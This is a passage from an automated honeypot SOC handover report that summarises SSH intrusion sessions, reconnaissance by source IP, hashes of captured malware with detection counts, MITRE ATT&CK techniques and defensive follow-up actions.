| `2026-04-01 12:17:55` | `cowrie.log.closed` |
| `2026-04-01 12:17:55` | `cowrie.session.params` |
| `2026-04-01 12:17:55` | `cowrie.command.input` |
| `2026-04-01 12:17:55` | `cowrie.session.file_download` |
| `2026-04-01 12:17:55` | `cowrie.log.closed` |
| `2026-04-01 12:17:56` | `cowrie.session.params` |
| `2026-04-01 12:17:56` | `cowrie.command.input` |
| `2026-04-01 12:17:56` | `cowrie.log.closed` |
| `2026-04-01 12:17:56` | `cowrie.session.params` |
| `2026-04-01 12:17:56` | `cowrie.command.input` |
| `2026-04-01 12:17:56` | `cowrie.log.closed` |
| `2026-04-01 12:17:57` | `cowrie.session.params` |
| `2026-04-01 12:17:57` | `cowrie.command.input` |
| `2026-04-01 12:17:57` | `cowrie.command.input` |
| `2026-04-01 12:17:57` | `cowrie.log.closed` |
| `2026-04-01 12:17:57` | `cowrie.session.params` |
| `2026-04-01 12:17:57` | `cowrie.command.input` |
| `2026-04-01 12:17:57` | `cowrie.log.closed` |
| `2026-04-01 12:17:58` | `cowrie.session.params` |
| `2026-04-01 12:17:58` | `cowrie.command.input` |
| `2026-04-01 12:17:58` | `cowrie.log.closed` |
| `2026-04-01 12:17:58` | `cowrie.session.params` |
| `2026-04-01 12:17:58` | `cowrie.command.input` |
| `2026-04-01 12:17:58` | `cowrie.log.closed` |
| `2026-04-01 12:17:58` | `cowrie.session.params` |
| `2026-04-01 12:17:58` | `cowrie.command.input` |
| `2026-04-01 12:17:59` | `cowrie.log.closed` |
| `2026-04-01 12:17:59` | `cowrie.session.params` |
| `2026-04-01 12:17:59` | `cowrie.command.input` |
| `2026-04-01 12:17:59` | `cowrie.log.closed` |
| `2026-04-01 12:17:59` | `cowrie.session.params` |
| `2026-04-01 12:17:59` | `cowrie.command.input` |
| `2026-04-01 12:17:59` | `cowrie.log.closed` |
| `2026-04-01 12:18:00` | `cowrie.session.params` |
| `2026-04-01 12:18:00` | `cowrie.command.input` |
| `2026-04-01 12:18:00` | `cowrie.log.closed` |
| `2026-04-01 12:18:00` | `cowrie.session.params` |
| `2026-04-01 12:18:00` | `cowrie.command.input` |
| `2026-04-01 12:18:00` | `cowrie.log.closed` |
| `2026-04-01 12:18:01` | `cowrie.session.params` |
| `2026-04-01 12:18:01` | `cowrie.command.input` |
| `2026-04-01 12:18:01` | `cowrie.log.closed` |
| `2026-04-01 12:18:01` | `cowrie.session.params` |
| `2026-04-01 12:18:01` | `cowrie.command.input` |
| `2026-04-01 12:18:01` | `cowrie.log.closed` |
| `2026-04-01 12:18:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]169` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43e5e3d40794

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]227` |
| **First Seen** | 2026-04-01 12:20 |
| **Last Seen** | 2026-04-01 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 12:20:42` | `cowrie.session.connect` |
| `2026-04-01 12:20:42` | `cowrie.client.version` |
| `2026-04-01 12:20:42` | `cowrie.client.kex` |
| `2026-04-01 12:20:43` | `cowrie.login.success` |
| `2026-04-01 12:20:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]227` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90542934357e

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]227` |
| **First Seen** | 2026-04-01 12:34 |
| **Last Seen** | 2026-04-01 12:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 12:34:52` | `cowrie.session.connect` |
| `2026-04-01 12:34:52` | `cowrie.client.version` |
| `2026-04-01 12:34:52` | `cowrie.client.kex` |
| `2026-04-01 12:34:52` | `cowrie.login.success` |
| `2026-04-01 12:34:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]227` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c656dc7e7346

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]227` |
| **First Seen** | 2026-04-01 12:48 |
| **Last Seen** | 2026-04-01 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 12:48:56` | `cowrie.session.connect` |
| `2026-04-01 12:48:56` | `cowrie.client.version` |
| `2026-04-01 12:48:56` | `cowrie.client.kex` |
| `2026-04-01 12:48:57` | `cowrie.login.success` |
| `2026-04-01 12:48:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]227` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c08394926c3a

| Field | Detail |
|---|---|
| **Source IP** | `211.20.26[.]201` |
| **First Seen** | 2026-04-01 12:56 |
| **Last Seen** | 2026-04-01 12:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 12:56:04` | `cowrie.session.connect` |
| `2026-04-01 12:56:05` | `cowrie.client.version` |
| `2026-04-01 12:56:05` | `cowrie.client.kex` |
| `2026-04-01 12:56:07` | `cowrie.login.success` |
| `2026-04-01 12:56:07` | `cowrie.direct-tcpip.request` |
| `2026-04-01 12:56:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.20.26[.]201` to AbuseIPDB if not already reported
- [ ] Block `211.20.26[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ee38711a393

| Field | Detail |
|---|---|
| **Source IP** | `62.201.212[.]54` |
| **First Seen** | 2026-04-01 12:56 |
| **Last Seen** | 2026-04-01 12:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 12:56:12` | `cowrie.session.connect` |
| `2026-04-01 12:56:13` | `cowrie.client.version` |
| `2026-04-01 12:56:13` | `cowrie.client.kex` |
| `2026-04-01 12:56:14` | `cowrie.login.success` |
| `2026-04-01 12:56:15` | `cowrie.direct-tcpip.request` |
| `2026-04-01 12:56:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.212[.]54` to AbuseIPDB if not already reported
- [ ] Block `62.201.212[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7382d23f21c8

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]227` |
| **First Seen** | 2026-04-01 13:03 |
| **Last Seen** | 2026-04-01 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 13:03:09` | `cowrie.session.connect` |
| `2026-04-01 13:03:09` | `cowrie.client.version` |
| `2026-04-01 13:03:09` | `cowrie.client.kex` |
| `2026-04-01 13:03:09` | `cowrie.login.success` |
| `2026-04-01 13:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]227` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `120.48.140[.]232` | **13** | 2026-04-01 11:19 | 2026-04-01 11:42 | 20m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `3.129.187[.]38` | **7** | 2026-04-01 12:48 | 2026-04-01 12:58 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `201.243.207[.]68` | **4** | 2026-04-01 11:28 | 2026-04-01 11:36 | 2m | 0 | `T1592` | 🟢 LOW |
| `14.103.123[.]169` | **2** | 2026-04-01 12:17 | 2026-04-01 12:19 | 4m | 0 | `T1592` | 🟢 LOW |
| `103.112.224[.]81` | 1 | 2026-04-01 11:15 | 2026-04-01 11:15 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.181.81[.]150` | 1 | 2026-04-01 11:26 | 2026-04-01 11:26 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.240.153[.]27` | 1 | 2026-04-01 11:37 | 2026-04-01 11:38 | 30s | 0 | `T1592` | 🟢 LOW |
| `111.70.23[.]245` | 1 | 2026-04-01 12:11 | 2026-04-01 12:11 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.34[.]60` | 1 | 2026-04-01 11:33 | 2026-04-01 11:33 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.62.174[.]87` | 1 | 2026-04-01 11:15 | 2026-04-01 11:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.114.94[.]242` | 1 | 2026-04-01 12:44 | 2026-04-01 12:44 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.140.172[.]32` | 1 | 2026-04-01 11:26 | 2026-04-01 11:26 | 13s | 0 | `T1592` | 🟢 LOW |
| `116.48.150[.]115` | 1 | 2026-04-01 12:45 | 2026-04-01 12:45 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.224.15[.]67` | 1 | 2026-04-01 12:25 | 2026-04-01 12:25 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.69[.]17` | 1 | 2026-04-01 12:38 | 2026-04-01 12:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.66.124[.]146` | 1 | 2026-04-01 12:36 | 2026-04-01 12:36 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `123.118.108[.]206` | 1 | 2026-04-01 12:29 | 2026-04-01 12:29 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.194.128[.]158` | 1 | 2026-04-01 13:05 | 2026-04-01 13:05 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `171.217.70[.]151` | 1 | 2026-04-01 12:13 | 2026-04-01 12:14 | 53s | 0 | `T1592` | 🟢 LOW |
| `178.124.218[.]103` | 1 | 2026-04-01 11:56 | 2026-04-01 11:56 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.184.85[.]167` | 1 | 2026-04-01 13:07 | 2026-04-01 13:07 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `18.206.252[.]118` | 1 | 2026-04-01 12:55 | 2026-04-01 12:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `201.243.119[.]131` | 1 | 2026-04-01 13:04 | 2026-04-01 13:04 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `203.145.34[.]222` | 1 | 2026-04-01 12:07 | 2026-04-01 12:07 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.128.15[.]127` | 1 | 2026-04-01 11:25 | 2026-04-01 11:25 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.190.110[.]210` | 1 | 2026-04-01 11:15 | 2026-04-01 11:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.216.140[.]3` | 1 | 2026-04-01 11:51 | 2026-04-01 11:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.237.94[.]18` | 1 | 2026-04-01 11:38 | 2026-04-01 11:38 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `39.174.42[.]18` | 1 | 2026-04-01 10:56 | 2026-04-01 10:56 | 8s | 0 | `T1592` | 🟢 LOW |
| `61.184.128[.]210` | 1 | 2026-04-01 12:48 | 2026-04-01 12:48 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `62.201.228[.]210` | 1 | 2026-04-01 12:16 | 2026-04-01 12:16 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.237[.]109` | 1 | 2026-04-01 10:56 | 2026-04-01 10:56 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `116.140.172[.]32` | CN | China United Network Communications Corporation Limited | **100** ⚠️ | 0 |
| `3.129.187[.]38` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `116.48.150[.]115` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 50 |
| `222.128.15[.]127` | CN | China Unicom Beijing province network | **100** ⚠️ | 50 |
| `35.216.140[.]3` | CH | Google LLC | **100** ⚠️ | 50 |
| `113.62.174[.]87` | CN | CHINANET XIZANG PROVINCE NETWORK | **100** ⚠️ | 1 |
| `14.194.128[.]158` | IN | Tata Teleservices Limited -GSM Division | **100** ⚠️ | 50 |
| `211.20.26[.]201` | TW | Data Communication Business Group, | **100** ⚠️ | 22 |
| `18.206.252[.]118` | US | Amazon Technologies Inc. | **100** ⚠️ | 15 |
| `179.184.85[.]167` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 58 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 23 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 19 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 78 cases |
| Tool 34  | Credential Extractor        | ✅ 46 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 43 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (9.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 31 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 17 priority case(s) shown individually · 32 recon entry/entries in table (4 group(s) consolidating 26 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-01T13:17:37Z_
